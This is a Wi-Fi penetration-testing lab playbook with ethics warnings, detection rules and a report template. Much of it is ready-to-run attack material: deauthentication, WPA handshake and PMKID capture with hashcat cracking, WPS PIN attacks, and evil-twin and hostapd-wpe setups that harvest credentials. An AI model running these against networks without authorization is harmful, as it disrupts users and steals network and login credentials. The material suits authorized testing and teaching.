

> **WARNING:** Only use this playbook on networks and devices you own or have explicit written permission to test. Keep logs, snapshots, and follow your local laws and Rules of Engagement (ROE).

---

## Table of contents
1. [Safety & Ethics](#safety--ethics)
2. [Quick checklist before you start](#quick-checklist-before-you-start)
3. [Host & VM topology (recommended)](#host--vm-topology-recommended)
4. [Required hardware & software](#required-hardware--software)
5. [Preparation (Kali guest) — step-by-step](#preparation-kali-guest--step-by-step)
6. [Monitor mode & capturing — detailed steps](#monitor-mode--capturing---detailed-steps)
7. [Exercise 1 — Passive reconnaissance (mapping APs & clients)](#exercise-1---passive-reconnaissance-mapping-aps--clients)
8. [Exercise 2 — Capture WPA/WPA2 4-way handshake (deauth method)](#exercise-2---capture-wpawpa2-4-way-handshake-deauth-method)
9. [Exercise 2b — PMKID capture (no deauth required)](#exercise-2b---pmkid-capture-no-deauth-required)
10. [Conversion & cracking (aircrack-ng & hashcat) — detailed commands](#conversion--cracking-aircrack-ng--hashcat---detailed-commands)
11. [Exercise 3 — Deauthentication / PMF testing & interpretation](#exercise-3---deauthentication--pmf-testing--interpretation)
12. [Exercise 4 — WPS testing (wash, reaver, bully) — safe use]
13. [Exercise 5 — Evil Twin / Rogue AP (hostapd + dnsmasq) — step-by-step lab]
14. [Exercise 6 — WPA2-Enterprise (hostapd-wpe) — high sensitivity lab]
15. [Monitoring & detection — Kismet, WIPS, SIEM rules (cheat sheet)](#monitoring--detection---kismet-wips-siem-rules-cheat-sheet)
16. [Reporting template (expanded)](#reporting-template-expanded)
17. [Cleanup & restore commands (safe）」
18. [Appendix: helpful commands & troubleshooting tips]
19. [Further learning resources and study plan]

---

## Safety & Ethics
- Obtain **explicit written permission** (scope, ROE) for any target that is not yours.
- Work on **isolated lab SSIDs** or spare AP hardware when possible.
- Use **low transmit power** or physical isolation (Faraday bag) to avoid affecting neighbors.
- Keep **VM snapshots** and logs; preserve pcaps as evidence.
- Avoid destructive attacks unless specifically authorized.

---

## Quick checklist before you start
- Snapshot attacker VM (Kali).
- Confirm USB Wi-Fi adapter is passed to attacker VM and visible (`lsusb`).
- Ensure target SSID is one you control.
- Stop NetworkManager or services that interfere with monitor mode: `sudo airmon-ng check kill`.
- Prepare wordlists and a GPU-capable machine if you plan to crack handshakes.

---

## Host & VM topology (recommended)
- **Host:** Arch Linux (your physical machine) — VirtualBox/VMware/Libvirt.
- **Attacker VM:** Kali Linux (USB Wi-Fi adapter attached to this VM; used for monitor mode & attacks).
- **Target AP:** Physical home AP or software AP on another machine using `hostapd` (preferred for isolation).
- **Victim client(s):** phones, laptops, or VMs that will connect to the target AP for testing.
- **Logging host (optional):** SIEM or logging VM where you store pcaps, logs, screenshots.

---

## Required hardware & software
- USB Wi‑Fi adapter that supports monitor mode and injection (e.g., TP‑Link Archer T3U Plus with 88x2bu driver). Use known-supported chipsets.
- Attacker VM: Kali Linux (latest), with `aircrack-ng`, `hcxdumptool`, `hcxtools`, `hashcat`, `bettercap`, `hostapd`, `hostapd-wpe`, `dnsmasq`, `kismet`, `wireshark` installed.
- Optional: GPU machine for hashcat cracking.

---

## Preparation (Kali guest) — step-by-step
1. Update and install tools:
```bash
sudo apt update
sudo apt install -y aircrack-ng hcxdumptool hcxtools hashcat bettercap hostapd hostapd-wpe dnsmasq kismet wireshark
```
2. Kill conflicting services (this will disrupt network connectivity on the VM):
```bash
sudo airmon-ng check kill
```
3. Verify adapter is attached and recognized by the guest:
```bash
lsusb
ip link
```
Make note of the interface name (e.g., `wlan0`).

4. (Optional) Set TX power low for lab containment (if supported):
```bash
sudo ip link set wlan0 down
sudo iw reg set BO
sudo iw dev wlan0 set txpower fixed 2000  # value in mBm (20 dBm) adjust as needed
sudo ip link set wlan0 up
```

---

## Monitor mode & capturing — detailed steps
1. Put interface into monitor mode (prefer `iw` over airmon-ng for cleaner naming):
```bash
sudo ip link set wlan0 down
sudo iw wlan0 set type monitor
sudo ip link set wlan0 up
# confirm:
iw dev wlan0 info
```
2. Passive scan to list APs & clients:
```bash
sudo airodump-ng wlan0
# or kismet for richer passive discovery
sudo kismet -c wlan0
```
3. If you prefer airmon-ng workflow (creates `wlan0mon`):
```bash
sudo airmon-ng start wlan0
# check created interface (e.g., wlan0mon)
```

Notes:
- `airodump-ng` shows ESSIDs, BSSIDs, CH, ENC (encryption), PWR, and STATIONs.
- Always capture using `--bssid` and `-c` to narrow the file and avoid huge captures.

---

## Exercise 1 — Passive reconnaissance (mapping APs & clients)
**Goal:** map SSIDs, channels, BSSIDs, encryption, hidden SSIDs, and associated clients.

1. Run airodump to discover targets:
```bash
sudo airodump-ng wlan0
```
2. Identify your target AP: note `BSSID`, `CH`, `ENC` (WPA/WPA2/WPA3/Open), and client MACs in `STATION`.
3. Narrow capture to target and save pcap:
```bash
sudo airodump-ng --bssid <BSSID> -c <CHANNEL> -w ./captures wlan0
```
4. Save the capture file for evidence and analysis.

Defensive takeaway: inventory of visible APs & clients is essential for risk assessment.

---

## Exercise 2 — Capture WPA/WPA2 4-way handshake (deauth method)
**Goal:** capture a full 4-way handshake for offline cracking.

1. Start targeted capture (as above):
```bash
sudo airodump-ng --bssid <BSSID> -c <CHANNEL> -w ./handshake wlan0
```
2. Trigger reauthentication (deauth). Be conservative with count; deauth bursts can impact user experience.
```bash
sudo aireplay-ng --deauth 5 -a <BSSID> wlan0
# targeted at a client:
sudo aireplay-ng --deauth 5 -a <BSSID> -c <CLIENT_MAC> wlan0
```
3. Monitor `airodump-ng` output to see `WPA handshake: <BSSID>` in the top-right corner — this indicates a successful capture.
4. If `airodump-ng` doesn’t show the handshake, you may need to capture again or target a specific client.

Caveats:
- Some clients/APs may ignore deauth (PMF/802.11w). In those cases, try PMKID or other methods.
- Ensure capture includes EAPOL frames from the 4-way handshake; incomplete captures won’t crack.

---

## Exercise 2b — PMKID capture (no deauth required)
**Goal:** capture PMKID frames which can be cracked offline as a PSK equivalent in many cases.

1. Use `hcxdumptool` to capture PMKIDs:
```bash
sudo hcxdumptool -i wlan0 -o pcapng --enable_status=1
# let it run while a client probes or passively
```
2. Convert the capture to hashcat format:
```bash
hcxpcapngtool -o hash.22000 capture.pcapng
```
3. Crack with hashcat (see next section).

Notes:
- PMKID method works against some APs (hostapd variations and newer firmwares). It’s less noisy since no deauth needed.

---

## Conversion & cracking (aircrack-ng & hashcat) — detailed commands

### Quick aircrack-ng (CPU, small wordlists)
```bash
aircrack-ng -w /path/to/wordlist.txt -b <BSSID> handshake-01.cap
```

### Convert pcap to hccapx / 22000 for hashcat (recommended GPU cracking)
- Using `hcxtools` / `hcxpcapngtool`:
```bash
# for pcapng produced by hcxdumptool or airodump
hcxpcapngtool -o handshake.22000 handshake-01.cap
# If using older cap->hccapx:
cap2hccapx.bin handshake-01.cap handshake.hccapx
```

### Example hashcat usage (22000: WPA-PBKDF2-PMKID+EAPOL)
```bash
hashcat -m 22000 handshake.22000 /path/to/wordlist -a 0 --status --status-timer=10 -w 3
# Example with rules and mask attacks:
hashcat -m 22000 handshake.22000 /path/to/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### GPU tips
- Use `--session` to resume.
- Use optimized kernels and appropriate workload profiles.
- Large wordlists + combinator/rules significantly increase hit chances.

---

## Exercise 3 — Deauthentication / PMF testing & interpretation
**Goal:** test whether deauth-based attacks succeed and infer PMF status.

1. Send a short deauth burst:
```bash
sudo aireplay-ng --deauth 5 -a <BSSID> wlan0
```
2. Observe client behavior: devices that reconnect quickly indicate lack of PMF; devices that ignore deauth or show no interruption may be protected.

3. Check AP configuration (where possible) for 802.11w/PMF settings.

Defensive: Enable PMF on APs and ensure client OS support; update firmware.

---

## Exercise 4 — WPS testing (wash, reaver, bully) — safe use
**Goal:** discover if WPS is enabled and test PIN vulnerability on equipment you own.

1. Discover WPS-enabled APs:
```bash
sudo wash -i wlan0
```
2. If WPS enabled and you have permission, test with `reaver` (be cautious):
```bash
sudo reaver -i wlan0 -b <BSSID> -vv
```
3. `bully` is an alternative that sometimes performs better on modern routers.

Warnings:
- WPS tests can lock APs or trigger rate-limiting; perform on owned hardware and during scheduled windows.
- Many modern APs have WPS disabled by default.

---

## Exercise 5 — Evil Twin / Rogue AP (hostapd + dnsmasq) — step-by-step lab
**Goal:** demonstrate captive-portal/social-engineering risks and client behavior in a controlled lab.

> Use a separate test SSID (do not mimic production SSIDs in an uncontrolled environment).

1. Create a dedicated interface or ensure `wlan0` is free for hostapd.

2. Example `hostapd.conf` (PSK AP for demo):
```
interface=wlan0
driver=nl80211
ssid=TestHomeSSID_Evil
channel=6
hw_mode=g
auth_algs=1
wpa=2
wpa_passphrase=TestPassphrase123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
```

3. Example `dnsmasq.conf` (DHCP + DNS to redirect all names to attacker captive portal):
```
interface=wlan0
dhcp-range=192.168.50.10,192.168.50.50,12h
address=/#/192.168.50.1
log-queries
log-dhcp
```

4. Start hostapd and dnsmasq in background (run from your lab folder):
```bash
sudo hostapd hostapd.conf &
sudo dnsmasq --conf-file=./dnsmasq.conf &
# start simple captive portal (http)
python3 -m http.server 80 --bind 192.168.50.1 &
```
5. Optionally use `bettercap` to intercept HTTP and HTTPS downgrade techniques (read bettercap docs). Bettercap can proxy, inject, and log credentials for lab demonstration.

6. Observe a test client connecting: it will receive DHCP and DNS pointing to your captive portal. If the client is auto-connected and the portal collects credentials (user types them), you’ll capture plaintext.

Defensive: train users not to enter credentials into unknown captive portals; use enterprise cert validation.

Cleanup (stop services):
```bash
sudo pkill hostapd
sudo pkill dnsmasq
sudo pkill python3
```

---

## Exercise 6 — WPA2-Enterprise (hostapd-wpe) — high sensitivity lab
**Goal:** demonstrate credential capture/misconfiguration risks in Enterprise setups. **HIGH SENSITIVITY — ONLY RUN IN ISOLATED LABS.**

1. Install and configure `hostapd-wpe` following project docs.
2. Start a rogue enterprise AP that requests EAP methods known to be vulnerable to credential harvesting (e.g., PEAP/MSCHAPv2) and log received credentials.
3. Analyze captured credentials and show remediation: use EAP-TLS with client certs, enforce server cert validation, and rotate RADIUS credentials.

---

## Monitoring & detection — Kismet, WIPS, SIEM rules (cheat sheet)
- **Kismet**: passive sensor for device/AP discovery, capture, and mapping. Use network of Kismet sensors for coverage.
- **WIPS rules (examples to create in SIEM):**
  - Alert on new AP advertising corporate SSID from unknown BSSID.
  - Deauth storm detection: many deauths per minute from single source → alert.
  - Sudden client re-associations to unknown BSSID advertising known SSID → medium priority.
  - PMKID capture attempts (hcxdumptool observed) → notify SOC.

---

## Reporting template (expanded)
Use this detailed template for client reports.

```
# Wi-Fi Pentest Report — <Date>

## 1. Scope & Authorization
- Targets: <SSIDs / BSSIDs>
- Authorised by: <name, contact, signed doc>
- Test window: <start-end>
- Exclusions: <devices, times, techniques not allowed>

## 2. Executive Summary
- High-level findings, business impact, and prioritized recommendations (1-2 paragraphs).

## 3. Environment & Inventory
- AP vendor/model, firmware version
- SSIDs, channels, encryption type, WPS status
- Clients observed (MAC, vendor guess, OS hints)

## 4. Findings (by severity)
### 4.1 High
- Example: WPS enabled on AP model X (cvss, impact). Evidence: wash output; PoC: run reaver. Recommendation: disable WPS.

### 4.2 Medium
- Example: Weak PSK cracked offline. Evidence: hashcat output; PoC: cracked plaintext. Recommendation: Replace PSK with 16+ char random or move to WPA3/Enterprise.

### 4.3 Low
- Example: Open guest SSID with no client isolation. Recommendation: enable client isolation and VLANs.

## 5. PoC & Evidence
- Attach handshake capture files, hostapd logs, screenshots, timestamps, command logs.

## 6. Remediation & Action Plan
- Tactical steps: disable WPS, enable PMF, enable guest VLAN, rotate PSK.
- Strategic: plan migration to WPA3/WPA2-Enterprise, implement WIPS.

## 7. Appendix
- Full command list used, tool versions, environment notes.
```

---

## Cleanup & restore commands (safe)
```bash
# kill tools/services started
sudo pkill hostapd
sudo pkill dnsmasq
sudo pkill bettercap
sudo pkill python3

# restore wlan to managed
sudo ip link set wlan0 down
sudo iw wlan0 set type managed
sudo ip link set wlan0 up

# restart network manager
sudo systemctl start NetworkManager
```

---

## Appendix: helpful commands & troubleshooting tips
- Check interface & driver:
```bash
ip link show
sudo iw dev wlan0 info
sudo dmesg | grep -i 88x2bu   # example for RTL drivers
```
- Verify handshake in capture:
```bash
aircrack-ng handshake-01.cap
# aircrack will list detected handshakes and allow quick test with wordlists
```
- Convert pcap for hashcat:
```bash
hcxpcapngtool -o handshake.22000 capture.pcapng
```
- If deauths show error or USB disconnect: check `dmesg` for `status: -71` (power/port issues).

---

## Further learning resources and study plan
- Week 1: 802.11 fundamentals, Wireshark frame analysis, passive recon (Kismet/Wireshark).
- Week 2: Monitor mode, handshake capture, airodump/aireplay, handshake cracking with aircrack/hashcat.
- Week 3: WPS testing, deauth/PMF testing, script automation for capture.
- Week 4: Evil Twin & captive portals, WPA2-Enterprise testing, WIPS detection and reporting.

---